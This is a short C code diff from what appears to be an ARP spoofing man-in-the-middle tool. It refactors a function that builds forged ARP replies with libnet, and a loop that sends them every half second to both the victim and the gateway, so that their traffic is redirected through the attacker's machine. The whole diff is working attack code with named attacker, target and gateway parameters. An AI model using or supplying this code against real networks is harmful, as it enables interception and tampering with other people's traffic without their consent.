@@ -26,7 +26,7 @@ int send_fake_ARP(char *dev, u_char *srcMac, u_char *dstMac, u_char *srcIp, u_ch
     }
 
     /* build ARP */
-    p_tag = libnet_build_arp(ARPHRD_ETHER, EPT_IPv4, 6, 4, 2,
+    p_tag = libnet_build_arp(ARPHRD_ETHER, EPT_IPv4, MAC_ADDR_LEN, IP_ADDR_LEN, ARP_REPLY,
     srcMac, srcIp, dstMac, dstIp, padPtr, 18, net_t, 0);
     if (p_tag == -1) {
         printf("libnet build_arp error\n");
@@ -55,12 +55,14 @@ int send_fake_ARP(char *dev, u_char *srcMac, u_char *dstMac, u_char *srcIp, u_ch
     return 0;
 }
 
-void Arpspoof(void *arg) {
-    struct arg real_arg = *(struct arg *)arg;
+void Arpspoof(void *ARG) {
+    MITM_info arg = *(MITM_info *)ARG;
     while (1) {
-        send_fake_ARP(real_arg.dev, ATTACKER_MAC, TARGET_MAC, GATEWAY_IP, TARGET_IP);
+        /* sent to victim */
+        send_fake_ARP(arg.dev, arg.ATTACKER_MAC, arg.TARGET_MAC, arg.GATEWAY_IP, arg.TARGET_IP);
         usleep(500000);
-        send_fake_ARP(real_arg.dev, ATTACKER_MAC, GATEWAY_MAC, TARGET_IP, GATEWAY_IP);
+        /* sent to gateway */
+        send_fake_ARP(arg.dev, arg.ATTACKER_MAC, arg.GATEWAY_MAC, arg.TARGET_IP, arg.GATEWAY_IP);
         usleep(500000);
     }
 }
